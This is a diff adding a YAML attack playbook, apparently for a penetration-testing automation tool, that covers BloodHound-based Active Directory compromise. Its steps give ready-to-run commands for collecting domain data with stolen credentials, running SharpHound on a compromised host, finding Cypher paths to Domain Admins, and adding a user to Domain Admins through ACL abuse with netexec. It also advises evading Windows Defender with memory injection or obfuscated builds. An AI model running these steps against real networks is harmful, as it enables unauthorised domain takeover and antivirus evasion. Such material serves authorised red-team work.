@@ -1,0 +1,82 @@
+id: bloodhound
+name: BloodHound Analysis & Attack Path Discovery
+category: ad
+description: Collect Active Directory relationship data using SharpHound or bloodhound-python, execute high-value Cypher queries to find shortest paths to Domain Admin, and abuse ACL relationships.
+port_triggers:
+  - 88
+  - 389
+  - 445
+  - 636
+service_triggers:
+  - ldap
+  - ldaps
+  - kerberos
+  - ad
+tags:
+  - bloodhound
+  - sharphound
+  - cypher
+  - acl-abuse
+  - attack-paths
+  - active-directory
+steps:
+  - id: bloodhound-python-ingest
+    title: Domain Ingestion via bloodhound-python (Remote / Linux)
+    phase: enumeration
+    purpose: Collect all AD users, groups, computers, sessions, trusts, and ACLs remotely from Linux using valid domain credentials.
+    command: bloodhound-python -u '{{USERNAME}}' -p '{{PASSWORD}}' -d '{{DOMAIN|corp.local}}' -dc '{{TARGET}}' -c All --zip -ns {{TARGET}}
+    expected_output:
+      - '[+] Connecting to LDAP server...'
+      - '[+] Dumping domain users, groups, computers, trusts...'
+      - '[+] Compressing output into bloodhound_TIMESTAMP.zip'
+    common_mistakes:
+      - Ensure DNS resolution for domain FQDN or specify `-ns <DC_IP>` and `-dc <DC_IP>`.
+    if_success: BloodHound ZIP archive generated. Import into Neo4j/BloodHound GUI for graph analysis.
+    if_failure: LDAP authentication failed or LDAPS required. Check credentials or try `-s` for SSL LDAP.
+    references:
+      - https://github.com/SpecterOps/BloodHound
+      - https://wadcoms.github.io/
+
+  - id: bloodhound-sharphound-ingest
+    title: SharpHound Ingestor Execution (Windows Shell)
+    phase: enumeration
+    purpose: Execute SharpHound on a compromised Windows domain joined host to collect session data, local admin memberships, and object relationships.
+    command: .\\SharpHound.exe -c All --outputdirectory C:\\Windows\\Temp --zipfilename bh_data.zip
+    expected_output:
+      - '[*] Initializing SharpHound...'
+      - '[*] Resolving Domain Controllers...'
+      - '[*] SharpHound Enumeration Completed. Zip file written to C:\Windows\Temp\bh_data.zip'
+    common_mistakes:
+      - Windows Defender may block SharpHound. Use memory injection, PowerShell reflection, or obfuscated builds.
+    if_success: Comprehensive session and group relationship data extracted. Transfer `bh_data.zip` to attacker system.
+    if_failure: Antivirus intercepted or restricted user cannot query domain. Check Defender logs.
+    references:
+      - https://bloodhound.readthedocs.io/
+
+  - id: bloodhound-high-value-cypher
+    title: Query Shortest Paths to Domain Admins & Unconstrained Delegation
+    phase: enumeration
+    purpose: Execute Cypher queries within BloodHound to identify privilege paths, DCSync rights, and unconstrained delegation hosts.
+    command: MATCH (m:User {name:'{{USERNAME|USER}}@{{DOMAIN|CORP.LOCAL}}'}),(n:Group {name:'DOMAIN ADMINS@{{DOMAIN|CORP.LOCAL}}'}), p=shortestPath((m)-[r:MemberOf|HasSession|AdminTo|AllExtendedRights|GenericAll|GenericWrite|WriteDacl|WriteOwner*1..]->(n)) RETURN p
+    expected_output:
+      - 'Shortest graph path displayed linking compromised user to Domain Admins group via intermediate hops.'
+    common_mistakes:
+      - BloodHound node names are uppercase (e.g. `USER@DOMAIN.LOCAL`).
+    if_success: Actionable attack path identified! Execute specific ACL abuse or session takeover.
+    if_failure: No direct path from current user. Expand search to all Kerberoastable or AS-REP roastable accounts.
+    references:
+      - https://bloodhound.readthedocs.io/en/latest/data-analysis/cypher-query-language.html
+
+  - id: bloodhound-genericall-abuse
+    title: Abuse GenericAll / GenericWrite on Target User or Group
+    phase: exploitation
+    purpose: Leverage full control (GenericAll) or WriteDacl permissions on an AD object to reset password, grant rights, or add user to Domain Admins.
+    command: netexec smb {{TARGET}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -d '{{DOMAIN|corp.local}}' -M dacl -o ACTION=add-member TARGET_GROUP='Domain Admins' USER='{{USERNAME}}'
+    expected_output:
+      - '[+] Successfully added user to group: Domain Admins'
+    common_mistakes:
+      - Ensure you have write permission on the target group object or WriteDacl.
+    if_success: Current user added to Domain Admins! Relog or request new TGT.
+    if_failure: Insufficient permissions. Check BlooHound for intermediary objects (e.g. nested group memberships).
+    references:
+      - https://wadcoms.github.io/
